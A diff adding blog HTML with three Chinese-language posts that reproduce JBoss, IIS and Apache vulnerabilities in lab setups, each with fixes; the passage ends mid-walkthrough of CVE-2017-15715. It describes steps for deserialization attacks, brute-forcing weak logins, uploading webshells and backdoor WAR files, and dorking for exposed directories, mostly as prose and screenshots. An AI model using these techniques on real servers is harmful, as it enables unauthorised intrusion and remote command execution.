@@ -260,6 +260,1754 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://shu1l.github.io/2020/04/03/jboss-zhong-jian-jian-lou-dong/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Shu1L">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/04/03/jboss-zhong-jian-jian-lou-dong/" itemprop="url">jBoss中间件漏洞</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-04-03T10:44:06+08:00">
+                2020-04-03
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E/" itemprop="url" rel="index">
+                    <span itemprop="name">中间件漏洞</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="jBoss中间件漏洞复现"><a href="#jBoss中间件漏洞复现" class="headerlink" title="jBoss中间件漏洞复现"></a>jBoss中间件漏洞复现</h2><h4 id="jBoss简介"><a href="#jBoss简介" class="headerlink" title="jBoss简介"></a>jBoss简介</h4><p>jBoss是一个基于J2EE的开发源代码的应用服务器。 JBoss代码遵循LGPL许可，可以在任何商业应用中免费使用。JBoss是一个管理EJB的容器和服务器，支持EJB1.1、EJB 2.0和EJB3的规范。但JBoss核心服务不包括支持servlet/JSP的WEB容器，一般与Tomcat或Jetty绑定使用。</p>
+<h4 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h4><h5 id="1-漏洞原理"><a href="#1-漏洞原理" class="headerlink" title="1.漏洞原理"></a>1.漏洞原理</h5><p>Java序列化，简而言之就是把java对象转化为字节序列的过程。而反序列话则是再把字节序列恢复为java对象的过程，然而就在这一转一变得过程中，程序员的过滤不严格，就可以导致恶意构造的代码的实现。</p>
+<p><strong>2、 漏洞复现</strong></p>
+<p>靶机启动jboss。</p>
+<p>攻击机访问靶机服务：</p>
+<p><a href="https://image.3001.net/images/20181216/1544955201_5c16254132af8.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955201_5c16254132af8.png!small" alt="img"></a></p>
+<p>访问/invoker/readonly。</p>
+<p>返回500，说明页面存在，此页面有反序列化漏洞：</p>
+<p><a href="https://image.3001.net/images/20181216/1544955212_5c16254c54a5e.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955212_5c16254c54a5e.png!small" alt="img"></a></p>
+<p>抓包：</p>
+<p><a href="https://image.3001.net/images/20181216/1544955225_5c162559c837c.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955225_5c162559c837c.png!small" alt="img"></a></p>
+<p>改包。</p>
+<p>POST payload.bin中数据。</p>
+<p><a href="https://image.3001.net/images/20181216/1544955253_5c162575ce0a6.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955253_5c162575ce0a6.png!small" alt="img"></a></p>
+<p><a href="https://image.3001.net/images/20181216/1544955240_5c162568b8024.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955240_5c162568b8024.png!small" alt="img"></a></p>
+<p>查看靶机，弹出计算器。</p>
+<p><a href="https://image.3001.net/images/20181216/1544955250_5c1625722d41e.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955250_5c1625722d41e.png!small" alt="img"></a></p>
+<p><strong>3、 漏洞修复</strong></p>
+<p>有效解决方案：升级到JBOSS AS7版本临时解决方案：</p>
+<p>1）不需要http-invoker.sar 组件的用户可直接删除此组件；</p>
+<p>2）用于对 httpinvoker 组件进行访问控制。</p>
+<h4 id="war后门文件部署"><a href="#war后门文件部署" class="headerlink" title="war后门文件部署"></a>war后门文件部署</h4><h5 id="1-漏洞原理-1"><a href="#1-漏洞原理-1" class="headerlink" title="1.漏洞原理"></a>1.漏洞原理</h5><p>jBoss后台管理页面存在弱口令，通过爆破获得账号密码。登陆后台上传包含后门的war包。</p>
+<p><strong>2、 漏洞复现</strong></p>
+<p><a href="https://image.3001.net/images/20181216/1544955269_5c16258565dca.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955269_5c16258565dca.png!small" alt="img"></a></p>
+<p><a href="https://image.3001.net/images/20181216/1544955275_5c16258b733e0.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955275_5c16258b733e0.png!small" alt="img"></a></p>
+<p>点击Web Application(war)s。</p>
+<p><a href="https://image.3001.net/images/20181216/1544955283_5c16259340980.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955283_5c16259340980.png!small" alt="img"></a></p>
+<p>点击add a new resource。</p>
+<p><a href="https://image.3001.net/images/20181216/1544955291_5c16259b4b362.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955291_5c16259b4b362.png!small" alt="img"></a></p>
+<p>选择一个war包上传，上传后，进入该war包，点击start。</p>
+<p><a href="https://image.3001.net/images/20181216/1544955300_5c1625a46f26a.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955300_5c1625a46f26a.png!small" alt="img"></a></p>
+<p>查看status为sucessful。</p>
+<p><a href="https://image.3001.net/images/20181216/1544955310_5c1625ae165ad.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955310_5c1625ae165ad.png!small" alt="img"></a></p>
+<p>访问该war包页面，进入后门。</p>
+<p>可进行文件管理和系统命令执行。</p>
+<p><a href="https://image.3001.net/images/20181216/1544955318_5c1625b6d0f4c.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955318_5c1625b6d0f4c.png!small" alt="img"></a></p>
+<p><a href="https://image.3001.net/images/20181216/1544955328_5c1625c0579fd.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955328_5c1625c0579fd.png!small" alt="img"></a></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://shu1l.github.io/2020/04/03/iis-zhong-jian-jian-lou-dong/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Shu1L">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/04/03/iis-zhong-jian-jian-lou-dong/" itemprop="url">IIS中间件漏洞</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-04-03T10:16:04+08:00">
+                2020-04-03
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E/" itemprop="url" rel="index">
+                    <span itemprop="name">中间件漏洞</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="IIS中间件漏洞复现"><a href="#IIS中间件漏洞复现" class="headerlink" title="IIS中间件漏洞复现"></a>IIS中间件漏洞复现</h2><p>[TOC]</p>
+<h4 id="IIS-put漏洞"><a href="#IIS-put漏洞" class="headerlink" title="IIS-put漏洞"></a>IIS-put漏洞</h4><p><strong>什么是IIS？</strong></p>
+<p>  IIS是一种Web（网页）服务组件，其中包括Web服务器、FTP服务器、NNTP服务器和SMTP服务器，分别用于网页浏览、文件传输、新闻服务和邮件发送等方面，它使得在网络（包括互联网和局域网）上发布信息成了一件很容易的事。</p>
+<h5 id="漏洞原理："><a href="#漏洞原理：" class="headerlink" title="漏洞原理："></a>漏洞原理：</h5><p>​      WebDAV （Web-based Distributed Authoring and Versioning） 是一种HTTP1.1的扩展协议。它扩展了HTTP 1.1，在GET、POST、HEAD等几个HTTP标准方法以外添加了一些新的方法，使应用程序可对Web Server直接读写，并支持写文件锁定(Locking)及解锁(Unlock)，还可以支持文件的版本控制。可以像在操作本地文件夹一样操作服务器上的文件夹，该扩展也存在缺陷，可以被恶意攻击者利用，直接上传恶意文件。</p>
+<h5 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h5><p>1.准备过程：</p>
+<p>安装windows server 2003版本，准备iis写入工具，下载IIS6.0版本</p>
+<p>2.复现过程：</p>
+<p>我们首先在虚拟机中打开win server 2003 版本。</p>
+<img src="QQ截图20200118185950.png" style="zoom:50%;" />
+
+<p>之后我们安装IIS6.0服务,进入网站配置界面</p>
+<img src="QQ截图20200118190925.png" style="zoom:50%;" />
+
+<p>打开webDAV服务配置  Active Server pages(允许解析asp文件)，提供文件写入权限。</p>
+<img src="QQ截图20200118191122.png" style="zoom:33%;" />
+
+<img src="QQ截图20200118191318.png" style="zoom: 50%;" />
+
+<p>我们尝试在物理机打开网站</p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200118191510.png" alt=""></p>
+<p>说明服务已开启。</p>
+<p>我们打开iis写入工具。尝试写入test.txt文件。</p>
+<img src="QQ截图20200118192007.png" style="zoom:50%;" />
+
+
+
+<p>发现提示“您未被授予查看该页”。</p>
+<p>后来发现未开启来宾用户足够的权限</p>
+<img src="QQ截图20200118192257.png" style="zoom:50%;" />
+
+<p>我们再次尝试。成功写入。</p>
+<img src="QQ截图20200118192408.png" style="zoom:50%;" />
+
+<img src="QQ截图20200118192500.png" style="zoom:50%;" />
+
+<p>我们新建一个asp一句话木马文件，先命名为shell.txt,写入网站根目录下。</p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200118193312.png" alt=""></p>
+<p>然后使用iiswrite的mv功能。首先我们需开启网站主目录下的脚本资源访问功能</p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200118112701.png" alt=""></p>
+<p>然后将根目录下的shell.txt修改为shell.asp</p>
+<img src="QQ截图20200118112855.png" style="zoom: 80%;" />
+
+<p>之后我们使用菜刀连接即可。</p>
+<h4 id="IIS-短文件名猜解漏洞"><a href="#IIS-短文件名猜解漏洞" class="headerlink" title="IIS-短文件名猜解漏洞"></a>IIS-短文件名猜解漏洞</h4><p><strong>什么是短文件名？</strong></p>
+<p>为了兼容16位MS-DOS程序，Windows为文件名较长的文件(和文件夹)生成对应的window 8.3短文件名。</p>
+<h5 id="漏洞原理：-1"><a href="#漏洞原理：-1" class="headerlink" title="漏洞原理："></a>漏洞原理：</h5><p>  为了兼容16位MS-DOS程序，Windows为文件名较长的文件（和文件夹）生成了对应的windows 8.3 短文件名。<br> 在Windows下查看对应的短文件名，可以使用命令 <code>dir /x</code></p>
+<p>​     攻击者使用通配符*和？发送一个请求到IIS，当IIS接收到一个文件路径中包含“~”请求时，返回的HTTP状态码和错误信息不同。基于这个特点，可以根据HTTP的响应区分一个可用或者不可用的文件。访问构造的某个存在的短文件名，会返回404；访问构造的某个不存在的短文件名，会返回400（报错页面）。</p>
+<h5 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h5><p>我们进入win server 2003的网站根目录下。</p>
+<img src="QQ截图20200118194442.png" style="zoom:67%;" />
+
+<p>在根目录下新建多个超过8个字符的文件名</p>
+<p>​                   <img src="QQ%E6%88%AA%E5%9B%BE20200118144312.png" alt=""></p>
+<p>我们在命令提示符使用 dir c:/x，即可看到我们创建的文件的短文件名。</p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200118144400.png" alt=""></p>
+<p>我们在物理机上访问该网站并使用通配符猜解文件名。</p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200202204523.png" alt=""></p>
+<p>可以看到网页回显404，说明网站根目录存在所猜解的文件名。</p>
+<img src="QQ截图20200202204745.png" style="zoom:67%;" />
+
+<p>我们访问不存在的文件会报错。</p>
+<h5 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h5><ol>
+<li>升级.net framework</li>
+<li>修改注册表键值：</li>
+</ol>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200202205239.png" alt=""></p>
+<p>将数值数据改为1，1代表不创建短文件名格式。修改完成后，需要重启系统生效。</p>
+<h4 id="IIS-解析漏洞"><a href="#IIS-解析漏洞" class="headerlink" title="IIS-解析漏洞"></a>IIS-解析漏洞</h4><h5 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h5><p>在网站下建立文件夹的名称中以.asp或.asa等作为后缀的文件夹,其目录内任何扩展名的文件都被IIS当作asp可执行文件去解析并执行.</p>
+<p>举例：/xx.asp/xx.jpg为xx.asp目录下存在xx.jpg文件,但将会被IIS解析成asp文件去执行,与原文件的后缀无关.</p>
+<h5 id="漏洞复现-2"><a href="#漏洞复现-2" class="headerlink" title="漏洞复现"></a>漏洞复现</h5><p>我们在www下新建一个test.asp文件夹和test.jpg图像文件</p>
+<p>在图像文件中写入任意字符。</p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200202210506.png" alt=""></p>
+<p>我们直接访问图像文件，发现无法成功解析。</p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200202210532.png" alt=""></p>
+<p>我们再将图片文件放入asp文件夹下重新尝试访问</p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200202210636.png" alt=""></p>
+<p>发现网站将该文件解析成了asp文件进而成功执行。</p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200202210706.png" alt=""></p>
+<h5 id="漏洞修复-1"><a href="#漏洞修复-1" class="headerlink" title="漏洞修复"></a>漏洞修复</h5><ul>
+<li>取消网站后台新建目录的功能，不允许新建目录。</li>
+<li>对新建目录文件名进行过滤，不允许新建包含.的文件夹。</li>
+</ul>
+<h4 id="IIS远程代码执行"><a href="#IIS远程代码执行" class="headerlink" title="IIS远程代码执行"></a>IIS远程代码执行</h4><h5 id="漏洞原理：-2"><a href="#漏洞原理：-2" class="headerlink" title="漏洞原理："></a>漏洞原理：</h5><p>​    在IIS6.0处理PROPFIND指令的时候，由于对url的长度没有进行有效的长度控制和检查，导致执行memcpy对虚拟路径进行构造的时候，引发栈溢出，从而导致远程代码执行。</p>
+<h5 id="漏洞复现："><a href="#漏洞复现：" class="headerlink" title="漏洞复现："></a>漏洞复现：</h5><p>1.漏洞环境搭建：</p>
+<p>在windows server 2003 r2 32位上安装iis6.0</p>
+<p>2.触发漏洞：</p>
+<p>在本地执行exp</p>
+<p><img src="4-2-1.png" alt=""></p>
+<p>执行成功后，服务器弹出计算器。</p>
+<p><img src="4-2-2.png" alt=""></p>
+<h5 id="漏洞修复："><a href="#漏洞修复：" class="headerlink" title="漏洞修复："></a>漏洞修复：</h5><p>1.关闭webDAV服务</p>
+<p>2.使用相关防护设备</p>
+<h5 id="参考文章：https-www-secpulse-com-archives-82410-html"><a href="#参考文章：https-www-secpulse-com-archives-82410-html" class="headerlink" title="参考文章：https://www.secpulse.com/archives/82410.html"></a>参考文章：<a href="https://www.secpulse.com/archives/82410.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/82410.html</a></h5>
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://shu1l.github.io/2020/04/02/apachhe-zhong-jian-jian-lou-dong/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Shu1L">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/04/02/apachhe-zhong-jian-jian-lou-dong/" itemprop="url">Apache中间件漏洞学习</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-04-02T23:47:11+08:00">
+                2020-04-02
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E/" itemprop="url" rel="index">
+                    <span itemprop="name">中间件漏洞</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h3 id="Apache中间件漏洞复现"><a href="#Apache中间件漏洞复现" class="headerlink" title="Apache中间件漏洞复现"></a>Apache中间件漏洞复现</h3><h4 id="关于apache"><a href="#关于apache" class="headerlink" title="关于apache"></a>关于apache</h4><h5 id="apache简介"><a href="#apache简介" class="headerlink" title="apache简介"></a>apache简介</h5><p>​       Apache HTTP Server（简称Apache）是Apache软件基金会的一个开放源码的网页服务器，可以在大多数计算机操作系统中运行，由于其多平台和安全性被广泛使用，是最流行的Web服务器端软件之一。它快速、可靠并且可通过简单的API扩展，将Perl/Python等解释器编译到服务器中。</p>
+<h5 id="Apache的目录结构："><a href="#Apache的目录结构：" class="headerlink" title="Apache的目录结构："></a>Apache的目录结构：</h5><ul>
+<li>bin——-存放常用的命令工具，例如httpd</li>
+<li>cgi-bin—存放Linux下常用的命令，例如xxx.sh</li>
+<li>conf——Linux的配置相关文件，例如httpd.conf</li>
+<li>error—–错误记录</li>
+<li>htdocs—-放网站源码</li>
+<li>icons—–网站图标</li>
+<li>logs——日志</li>
+<li>modules—扩展模块</li>
+<li>manual—-手册</li>
+</ul>
+<h5 id="apache原理介绍"><a href="#apache原理介绍" class="headerlink" title="apache原理介绍:"></a>apache原理介绍:</h5><p>要讲到的Apahce的漏洞必须要理解Apache的运行原理。</p>
+<p><img src="C:%5CUsers%5C%E5%B0%9A%E6%85%A7%E4%BA%AE%5CMusic%5Cv2-61e13c6df766e990c4e228d3222fee36_720w.jpg" alt=""></p>
+<p>图中简易描述了Apahce与PHP配合完成了一次WEB请求，Apahce在前，PHP在后，那两者之间如何进行通信的呢？先了解下PHP的架构。如下图</p>
+<p><img src="C:%5CUsers%5C%E5%B0%9A%E6%85%A7%E4%BA%AE%5CMusic%5Cv2-7692da2f8367d3fff6ef09df67fba07a_720w.jpg" alt=""></p>
+<ul>
+<li>Zend Engine是PHP的底层实现，包含编译和执行，底层由C语言实现。</li>
+<li>Zend API、Zend Extension API是基于Zend底层对外封装提供服务。</li>
+<li>Extendions使用Extension API实现了扩展库、标准库，例如各种内置函数、MySQL连接库等</li>
+<li>SAPI是重点，全称是Server Application Programming Interface，也就是服务端应用编程接口。PHP就是通过它来和Apache、Nginx、FastCGI交互</li>
+<li>Application是最上层，也就是我们写的PHP代码了</li>
+</ul>
+<p>Apache本身是不支持PHP解析的,通过架构图我们可以知道是通过SAPI进行通信，那Apache如何和SAPI通信呢？Apache怎么知道什么类型的文件要解析为PHP？如果你手动搭建过Apache解析PHP的环境，就肯定了解这两个步骤：</p>
+<pre><code># 加载php5_module模块
+LoadModule php5_module php5apache2_2.dll的路径
+# 添加可以执行php的文件类型，让.php文件类型解析为PHP
+AddType application/x-httpd-php .php
+# 或者将AddType变为下面的(在Apache 2.4.0~2.4.29中默认使用了该方式)
+&lt;FilesMatch \.php$&gt;
+    SetHandler application/x-httpd-php
+&lt;/FilesMatch&gt;
+以及
+&lt;IfModule dir_module&gt;
+DirectoryIndex index.html index.htm index.php index.phtml
+&lt;/IfModule&gt;</code></pre><p>​    Apache通过LoadModule来加载php5_module模块（php5apache2_2.dll），这样做的目的是让Apache加载php5_module模块来解析PHP文件。意思其实就是用LoadModule来加载php5_module。也就是把php作为Apache的一个子模块来运行。当通过Web访问php文件时，Apache就会调用php5_module来解析php代码。<br>调用过程可以概括为</p>
+<pre><code>HTTP-&gt;Apahce-&gt;php5_module-&gt;sapi-&gt;php。</code></pre><h4 id="Apache-文件解析漏洞"><a href="#Apache-文件解析漏洞" class="headerlink" title="Apache 文件解析漏洞"></a>Apache 文件解析漏洞</h4><h5 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h5><p>​       Apache文件解析漏洞与用户的配置有密切关系，严格来说属于用户的配置问题。Apache文件解析漏洞涉及到一个解析文件的特性。Apache默认一个文件可以有多个以点分隔的后缀，当右边的后缀无法识别，则继续向左识别，发现后缀是php,交给php处理这个文件。</p>
+<h5 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h5><p>我们首先打开phpstudy，切换apache版本为5.2.17.</p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200201102616.png" alt=""></p>
+<p>我们在本地网站根目录下新建文本文档写入任意字母。</p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200201104725.png" alt=""></p>
+<p>我们尝试修改后缀名为不存在的.456，然后在本地访问该文件</p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200201104035.png" alt=""></p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200201104057.png" alt=""></p>
+<p>发现仍然可以成功读取</p>
+<p>我们继续修改后缀名</p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200201104123.png" alt=""></p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200201104141.png" alt=""></p>
+<p>发现服务器仍然可以解析</p>
+<p>我们修改为.php.360尝试，依然可以成功解析。</p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200201104210.png" alt=""></p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200201104231.png" alt=""></p>
+<p>那么我们在文件上传时就可以利用Apache的解析特性进行绕过</p>
+<h5 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h5><p>在httpd.conf或httpd-vhosts.conf中加入以下语句，从而禁止文件名格式为<em>.php.\</em>的访问权限：</p>
+<pre class=" language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>FilesMatch</span> <span class="token attr-name">".(php.|php3.|php4|php5.)"</span><span class="token punctuation">></span></span></span>
+Order Deny<span class="token punctuation">,</span>Allow
+Deny from all
+<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>FilesMatch</span><span class="token punctuation">></span></span></span></code></pre>
+<h4 id="Apache-目录遍历漏洞"><a href="#Apache-目录遍历漏洞" class="headerlink" title="Apache 目录遍历漏洞"></a>Apache 目录遍历漏洞</h4><h5 id="漏洞原理-1"><a href="#漏洞原理-1" class="headerlink" title="漏洞原理"></a>漏洞原理</h5><p> 目录遍历（路径遍历）是由于web服务器或者web应用程序对用户输入的文件名称的安全性验证不足而导致的一种安全漏洞。使得攻击者通过利用一些特殊字符就可以绕过服务器的安全限制，访问任意的文件（可以是web根目录以外的文件），甚至执行系统命令。</p>
+<p>​      程序在实现上没有充分过滤用户输入的../之类的目录跳转符，导致恶意用户可以通过提交目录跳转来遍历服务器上的任意文件。</p>
+<h5 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h5><p>我们打开phpstudy.</p>
+<p>然后在本地网站根目录下新建多个子目录</p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200201112807.png" alt=""></p>
+<p>我们此时访问网站</p>
+<p><img src="18d8bc3eb13533fa38aa502b974b3d1a41345b31.jpg" alt=""></p>
+<p>可以看到很明显的index  of标志,说明此时存在目录遍历</p>
+<p>我们可以在谷歌中通过 intitle ：index of来帮我们寻找目录遍历漏洞</p>
+<h5 id="漏洞防御"><a href="#漏洞防御" class="headerlink" title="漏洞防御"></a>漏洞防御</h5><p>在httpd.conf文件中找到Options + Indexes + FollowSymLinks + ExecCGI并修改成</p>
+<p>Options -Indexes + FollowSymLinks + ExecCGI并保存（把+修改为-）</p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200201114345.png" alt=""></p>
+<h4 id="Apache换行解析漏洞"><a href="#Apache换行解析漏洞" class="headerlink" title="Apache换行解析漏洞"></a>Apache换行解析漏洞</h4><p>参考：<a href="https://github.com/zhangzhenfeng/vulhub/tree/master/httpd/CVE-2017-15715" target="_blank" rel="noopener">https://github.com/zhangzhenfeng/vulhub/tree/master/httpd/CVE-2017-15715</a></p>
+<p><strong>影响版本</strong>：Apache 2.4.0~2.4.29</p>
+<p><strong>影响说明</strong>：绕过服务器策略，上传webshell</p>
+<p><strong>环境说明</strong>：PHP5.5 、 Apache2.4.10</p>
+<p><strong>环境搭建</strong>：<br>此次环境使用docker环境搭建，环境采用地址<a href="https://link.zhihu.com/?target=https%3A//github.com/zhangzhenfeng/vulhub/tree/master/httpd/CVE-2017-15715">Vulhub</a>，环境文件有3个</p>
+<ul>
+<li>Dockerfile(apache环境)</li>
+<li>docker-compose.yml（compose文件，在此环境中意义不大）</li>
+<li>index.php（源文件缺少前台源码，已补全）</li>
+</ul>
+<p>执行构建环境命令如下（启动后在浏览器中访问<a href="https://link.zhihu.com/?target=http%3A//127.0.0.1%3A8080">http://127.0.0.1:8080</a>）</p>
+<pre class=" language-bash"><code class="language-bash">docker-compose build
+docker-compose up -d</code></pre>
+<h5 id="漏洞原理："><a href="#漏洞原理：" class="headerlink" title="漏洞原理："></a>漏洞原理：</h5><p>Apache HTTPD是一款HTTP服务器，它可以通过mod_php来运行PHP网页。其2.4.0~2.4.29版本中存在一个解析漏洞，在解析PHP时，<code>1.php\x0A</code>将被按照PHP后缀进行解析，导致绕过一些服务器的安全策略。</p>
+<h5 id="漏洞复现："><a href="#漏洞复现：" class="headerlink" title="漏洞复现："></a>漏洞复现：</h5><p>​        接下来通过实验的方式复现整个利用过程，首先先确认环境中的配置文件是否是&lt;FilesMatch .php$&gt;，路径为/etc/apache2/conf-available/docker-php.conf，该路径取决于apache2的目录，在搭建环境的时候不同apache版本路径可能不同，在Linux下的apache目录下执行grep -rn “FilesMatch” * 即可搜索到。<em>（在FilesMatch中的定义是将.php为后缀的文件解析为PHP，如果将其改为.(php|html)$的话，html中的php也会被解析。）</em><br>按照正常的漏洞利用步骤将其复现<br>0x01 抓包／改包<br>准备工作：将浏览器的代理打开、将burpsuit打开开启抓包。<br>访问漏洞页面<a href="https://link.zhihu.com/?target=http%3A//IP%3A8080/index.php">http://IP:8080/index.php</a>可以看到</p>
+<p><img src="https://pic1.zhimg.com/80/v2-17a95fd0f1c3533df7c1ec56c642cfd8_720w.jpg" alt="img"></p>
+<p>点击submit进行上传，burp可以抓到</p>
+<p><img src="https://pic1.zhimg.com/80/v2-c3df365945893aa605e58927c377e110_720w.jpg" alt="img"></p>
+<p>上图中最下面标红的地方是index.php代码中获取文件名的位置，但现在为空，需要填写上phpinfo.php1，后缀加1的目的是占位，下一步将1改为0x0a，点击上面红色箭头指向的Hex，将包修改为以下内容：</p>
